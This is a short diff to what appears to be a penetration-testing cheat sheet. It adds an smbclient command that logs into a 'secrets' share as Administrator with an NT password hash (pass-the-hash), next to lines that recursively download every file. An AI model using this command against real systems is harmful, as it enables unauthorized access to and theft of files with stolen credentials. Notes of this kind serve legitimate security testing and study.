@@ -4157,6 +4157,9 @@ prompt off
 recurse true
 mget *
 
+# Command connect share with hash password
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+
 
 ```
 ## updog
